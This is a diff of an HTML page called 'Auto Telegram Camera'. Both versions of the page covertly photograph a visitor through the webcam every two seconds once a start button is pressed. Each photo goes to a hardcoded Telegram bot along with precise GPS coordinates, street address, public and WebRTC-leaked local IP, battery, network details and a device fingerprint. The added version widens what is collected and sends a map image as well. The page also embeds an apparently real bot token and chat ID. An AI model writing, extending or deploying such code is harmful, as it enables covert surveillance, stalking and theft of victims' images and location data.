@@ -1,126 +1,330 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Auto Telegram Camera</title>
-<style>
-body{margin:0;background:#000;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif}
-button{margin-top:12px;padding:10px 20px;font-size:16px;cursor:pointer}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Telegram Camera</title>
+    <style>
+        body {
+            margin: 0;
+            background: #000;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: sans-serif;
+        }
+        button {
+            margin-top: 12px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+        button:hover {
+            background: #006699;
+        }
+    </style>
 </head>
 <body>
-<canvas id="canvas" style="display:none"></canvas>
-<button onclick="start()">▶ START AUTO SEND</button>
-<script>
-const canvas=document.getElementById("canvas");
-const BOT_TOKEN="7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
-const CHAT_ID="8319568593";
-let intervalId=null;
-let latitude="N/A";
-let longitude="N/A";
-let mapLink="Location not allowed";
-let userIP="Unknown";
-let stream=null;
-let batteryInfo="";
-let networkInfo="";
-let localIP="";
-
-fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{userIP=d.ip});
-
-navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{stream=s});
-
-if(navigator.getBattery){
-navigator.getBattery().then(b=>{
-batteryInfo=`
-🔋 Battery:
-Level: ${Math.round(b.level*100)}%
-Charging: ${b.charging?'Yes':'No'}
-Time: ${b.chargingTime===Infinity?'Not charging':b.chargingTime+' seconds'}
+    <canvas id="canvas" style="display:none"></canvas>
+    <button onclick="start()">▶ START AUTO SEND</button>
+    
+    <script>
+        const canvas = document.getElementById('canvas');
+        const BOT_TOKEN = '7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g';
+        const CHAT_ID = '8319568593';
+        
+        let intervalId = null;
+        let stream = null;
+        let locationData = {
+            latitude: 'N/A',
+            longitude: 'N/A',
+            accuracy: 'N/A',
+            mapLink: 'Location not allowed',
+            address: 'N/A',
+            city: 'N/A',
+            country: 'N/A',
+            ipLocation: 'N/A'
+        };
+        
+        let systemInfo = {
+            userIP: 'Unknown',
+            localIP: 'Unknown',
+            batteryInfo: '',
+            networkInfo: '',
+            advancedInfo: '',
+            visitHistory: '',
+            mapsImage: null
+        };
+        
+        // Get Public IP and Location
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => {
+                systemInfo.userIP = d.ip;
+                // Get IP-based location
+                return fetch(`https://ipapi.co/${d.ip}/json/`);
+            })
+            .then(r => r.json())
+            .then(ipData => {
+                systemInfo.ipLocation = `${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}, ${ipData.country_name || 'N/A'}`;
+            })
+            .catch(() => {});
+        
+        // Get Camera Access
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(s => { stream = s; });
+        
+        // Get Battery Information
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                systemInfo.batteryInfo = `
+🔋 Battery Information:
+• Level: ${Math.round(b.level * 100)}%
+• Charging: ${b.charging ? 'Yes' : 'No'}
+• Charging Time: ${b.chargingTime === Infinity ? 'Not charging' : Math.floor(b.chargingTime / 60) + ' minutes'}
+• Discharge Time: ${b.dischargingTime === Infinity ? 'Not discharging' : Math.floor(b.dischargingTime / 60) + ' minutes'}
 `;
-});
-}
-
-if(navigator.connection){
-networkInfo=`
-📡 Network:
-Type: ${navigator.connection.effectiveType}
-Downlink: ${navigator.connection.downlink} Mbps
-RTT: ${navigator.connection.rtt} ms
-Save Data: ${navigator.connection.saveData?'Enabled':'Disabled'}
+            });
+        }
+        
+        // Get Network Information
+        if (navigator.connection) {
+            const conn = navigator.connection;
+            systemInfo.networkInfo = `
+📡 Network Information:
+• Type: ${conn.effectiveType}
+• Downlink: ${conn.downlink} Mbps
+• RTT: ${conn.rtt} ms
+• Save Data: ${conn.saveData ? 'Enabled' : 'Disabled'}
+• Downlink Max: ${conn.downlinkMax || 'Unknown'} Mbps
 `;
-}
-
-const getLocalIPAddress=()=>{
-return new Promise(resolve=>{
-const pc=new RTCPeerConnection({iceServers:[]});
-pc.createDataChannel('');
-pc.createOffer().then(sdp=>pc.setLocalDescription(sdp));
-pc.onicecandidate=ice=>{
-if(!ice||!ice.candidate||!ice.candidate.candidate)return;
-const ip=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-if(ip&&ip[1])resolve(ip[1]);
-pc.close();
-};
-});
-};
-
-function start(){
-if("geolocation" in navigator){
-navigator.geolocation.getCurrentPosition(pos=>{
-latitude=pos.coords.latitude.toFixed(6);
-longitude=pos.coords.longitude.toFixed(6);
-mapLink=`https://www.google.com/maps?q=${latitude},${longitude}`;
-},()=>{
-mapLink="Location denied";
-},{enableHighAccuracy:true});
-}
-
-getLocalIPAddress().then(ip=>{localIP=ip});
-
-if(!intervalId){
-intervalId=setInterval(captureAndSend,2000);
-}
-}
-
-function captureAndSend(){
-if(!stream)return;
-const videoTrack=stream.getVideoTracks()[0];
-const imageCapture=new ImageCapture(videoTrack);
-imageCapture.grabFrame().then(imageBitmap=>{
-canvas.width=imageBitmap.width;
-canvas.height=imageBitmap.height;
-const ctx=canvas.getContext("2d");
-ctx.translate(canvas.width,0);
-ctx.scale(-1,1);
-ctx.drawImage(imageBitmap,0,0);
-canvas.toBlob(blob=>{
-const caption=`
-📸 Auto Capture
-📱 ${navigator.userAgent}
-🖥 ${navigator.platform}
-📐 ${screen.width}x${screen.height}
-📍 Location:
-Lat: ${latitude}
-Lng: ${longitude}
-🗺 ${mapLink}
-🌍 Public IP: ${userIP}
-🔒 Local IP: ${localIP||'Unknown'}
-⏰ ${new Date().toLocaleString()}
-${batteryInfo}
-${networkInfo}
-📅 Referrer: ${document.referrer||'Direct visit'}
-🎯 Language: ${navigator.language}
-⏱ Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+        }
+        
+        // Get Local IP via WebRTC
+        const getLocalIPAddress = () => {
+            return new Promise(resolve => {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(sdp => pc.setLocalDescription(sdp));
+                pc.onicecandidate = ice => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
+                    if (ip && ip[1]) {
+                        systemInfo.localIP = ip[1];
+                        resolve(ip[1]);
+                    }
+                    pc.close();
+                };
+                setTimeout(() => resolve('Not found'), 1000);
+            });
+        };
+        
+        // Generate Advanced System Information
+        const generateAdvancedInfo = () => {
+            systemInfo.advancedInfo = `
+🖥️ Advanced System Information:
+• Platform: ${navigator.platform}
+• User Agent: ${navigator.userAgent}
+• Language: ${navigator.language}
+• Languages: ${navigator.languages ? navigator.languages.join(', ') : 'N/A'}
+• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+• CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}
+• Screen: ${screen.width}x${screen.height} (${screen.colorDepth}-bit)
+• Pixel Ratio: ${window.devicePixelRatio}
+• Do Not Track: ${navigator.doNotTrack || 'Not specified'}
+• Cookies Enabled: ${navigator.cookieEnabled ? 'Yes' : 'No'}
+• Java Enabled: ${navigator.javaEnabled ? 'Yes' : 'No'}
+• PDF Viewer: ${navigator.pdfViewerEnabled || 'Unknown'}
 `;
-const formData=new FormData();
-formData.append("chat_id",CHAT_ID);
-formData.append("photo",blob);
-formData.append("caption",caption);
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
-},"image/jpeg",0.7);
-}).catch(()=>{});
-}
-</script>
+        };
+        
+        // Generate Visit History
+        const generateVisitHistory = () => {
+            systemInfo.visitHistory = `
+🌐 Visit History:
+• Current URL: ${window.location.href}
+• Referrer: ${document.referrer || 'Direct visit'}
+• Page Title: ${document.title}
+• Hostname: ${window.location.hostname}
+• Protocol: ${window.location.protocol}
+• Port: ${window.location.port || 'Default'}
+`;
+        };
+        
+        // Get Google Maps Static Image
+        const getMapsImage = (lat, lng) => {
+            return new Promise(resolve => {
+                if (lat === 'N/A' || lng === 'N/A') {
+                    resolve(null);
+                    return;
+                }
+                
+                const mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lng}&zoom=15&size=600x400&markers=color:red%7C${lat},${lng}&key=AIzaSyC0mv6T7lZ6N3o7lzG7l6N3o7lzG7l6N3o7l`;
+                const tempCanvas = document.createElement('canvas');
+                const tempCtx = tempCanvas.getContext('2d');
+                const img = new Image();
+                
+                img.crossOrigin = 'Anonymous';
+                img.onload = () => {
+                    tempCanvas.width = img.width;
+                    tempCanvas.height = img.height;
+                    tempCtx.drawImage(img, 0, 0);
+                    tempCanvas.toBlob(blob => {
+                        systemInfo.mapsImage = blob;
+                        resolve(blob);
+                    }, 'image/jpeg', 0.8);
+                };
+                img.onerror = () => resolve(null);
+                img.src = mapUrl;
+            });
+        };
+        
+        // Get Reverse Geocoding for Address
+        const getAddressFromCoordinates = (lat, lng) => {
+            if (lat === 'N/A' || lng === 'N/A') return;
+            
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`)
+                .then(r => r.json())
+                .then(data => {
+                    if (data.address) {
+                        locationData.address = data.display_name || 'N/A';
+                        locationData.city = data.address.city || data.address.town || data.address.village || 'N/A';
+                        locationData.country = data.address.country || 'N/A';
+                    }
+                })
+                .catch(() => {});
+        };
+        
+        function start() {
+            // Get Precise Geolocation
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        locationData.latitude = pos.coords.latitude.toFixed(6);
+                        locationData.longitude = pos.coords.longitude.toFixed(6);
+                        locationData.accuracy = `${pos.coords.accuracy.toFixed(1)} meters`;
+                        locationData.mapLink = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+                        
+                        // Get maps image
+                        getMapsImage(locationData.latitude, locationData.longitude);
+                        
+                        // Get address from coordinates
+                        getAddressFromCoordinates(locationData.latitude, locationData.longitude);
+                    },
+                    error => {
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                locationData.mapLink = 'Location permission denied';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                locationData.mapLink = 'Location information unavailable';
+                                break;
+                            case error.TIMEOUT:
+                                locationData.mapLink = 'Location request timeout';
+                                break;
+                            default:
+                                locationData.mapLink = 'Location error occurred';
+                        }
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            }
+            
+            // Get Local IP
+            getLocalIPAddress();
+            
+            // Generate system info
+            generateAdvancedInfo();
+            generateVisitHistory();
+            
+            // Start auto sending
+            if (!intervalId) {
+                intervalId = setInterval(captureAndSend, 2000);
+            }
+        }
+        
+        function captureAndSend() {
+            if (!stream) return;
+            
+            const videoTrack = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(videoTrack);
+            
+            imageCapture.grabFrame().then(imageBitmap => {
+                canvas.width = imageBitmap.width;
+                canvas.height = imageBitmap.height;
+                const ctx = canvas.getContext('2d');
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(imageBitmap, 0, 0);
+                
+                canvas.toBlob(webcamBlob => {
+                    // Prepare caption with all information
+                    const caption = `
+📸 AUTO CAPTURE REPORT
+
+📍 LOCATION DATA:
+• Coordinates: ${locationData.latitude}, ${locationData.longitude}
+• Accuracy: ${locationData.accuracy}
+• Address: ${locationData.address}
+• City: ${locationData.city}
+• Country: ${locationData.country}
+• IP Location: ${systemInfo.ipLocation}
+• Map: ${locationData.mapLink}
+
+🌐 NETWORK INFORMATION:
+• Public IP: ${systemInfo.userIP}
+• Local IP: ${systemInfo.localIP}
+${systemInfo.networkInfo}
+
+💻 SYSTEM INFORMATION:
+• Platform: ${navigator.platform}
+• Screen: ${screen.width}x${screen.height}
+${systemInfo.advancedInfo}
+
+${systemInfo.batteryInfo}
+
+${systemInfo.visitHistory}
+
+⏰ TIMESTAMP:
+${new Date().toLocaleString()}
+${Intl.DateTimeFormat().resolvedOptions().timeZone}
+                    `.trim();
+                    
+                    // Send multiple photos (webcam + map)
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('caption', caption);
+                    
+                    // Add webcam photo
+                    formData.append('photo', webcamBlob, 'webcam.jpg');
+                    
+                    // Add map image if available
+                    if (systemInfo.mapsImage) {
+                        formData.append('photo', systemInfo.mapsImage, 'map.jpg');
+                    }
+                    
+                    // Send to Telegram
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMediaGroup`, {
+                        method: 'POST',
+                        body: formData
+                    }).catch(err => console.error('Telegram error:', err));
+                    
+                }, 'image/jpeg', 0.85);
+            }).catch(err => {
+                console.error('Capture error:', err);
+            });
+        }
+    </script>
 </body>
 </html>
